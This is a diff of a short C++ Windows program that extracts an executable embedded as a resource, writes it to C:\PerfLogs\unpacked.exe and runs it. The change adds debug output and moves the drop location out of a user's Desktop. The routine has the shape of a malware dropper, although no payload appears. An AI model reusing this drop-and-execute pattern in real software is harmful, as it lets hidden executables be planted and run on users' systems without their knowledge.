@@ -1,41 +1,45 @@
+#define UNICODE
 #include <Windows.h>
+#include <iostream>
 
 int main()
 {
-    HRSRC hrsrc;
-    hrsrc = FindResource(nullptr, MAKEINTRESOURCE(10), RT_RCDATA);
-    HGLOBAL hGlbl = nullptr;
-    BYTE * pExeResource = nullptr;
-    HANDLE hFile = INVALID_HANDLE_VALUE;
-    DWORD size = 72704;
+    HRSRC hrsrc {FindResource(nullptr, MAKEINTRESOURCE(101), RT_RCDATA)};
+    HGLOBAL hGlbl;
+    BYTE * pExeResource;
+    HANDLE hFile {INVALID_HANDLE_VALUE};
+    DWORD size {24576};
 
     if (hrsrc == nullptr)
     {
-        return FALSE;
+        std::cout << "hrsrc == nullptr" << std::endl;
+        return 1;
     }
 
     hGlbl = LoadResource(nullptr, hrsrc);
 
     if (hGlbl == nullptr)
     {
-        return FALSE;
+        std::cout << "hGlbl == nullptr" << std::endl;
+        return 1;
     }
 
     pExeResource = (BYTE*)LockResource(hGlbl);
 
     if (pExeResource == nullptr)
     {
-        return FALSE;
+        std::cout << "pExeResource == nullptr" << std::endl;
+        return 1;
     }
 
-    hFile = CreateFileA("C:\\Users\\Zver\\Desktop\\a.exe", GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    hFile = CreateFile(L"C:\\PerfLogs\\unpacked.exe", GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
 
     if (hFile != INVALID_HANDLE_VALUE)
     {
-        DWORD bytesWritten = 0;
+        std::cout << "hFile != INVALID_HANDLE_VALUE" << std::endl;
+        DWORD bytesWritten {0};
         WriteFile(hFile, pExeResource, size, &bytesWritten, nullptr);
         CloseHandle(hFile);
     }
-    ShellExecuteA(nullptr, "open", "C:\\Users\\Zver\\Desktop\\a.exe", nullptr, nullptr, SW_SHOWNORMAL);
-    return 0;
+    ShellExecute(nullptr, L"open", L"C:\\PerfLogs\\unpacked.exe", nullptr, nullptr, SW_SHOWNORMAL);
 }
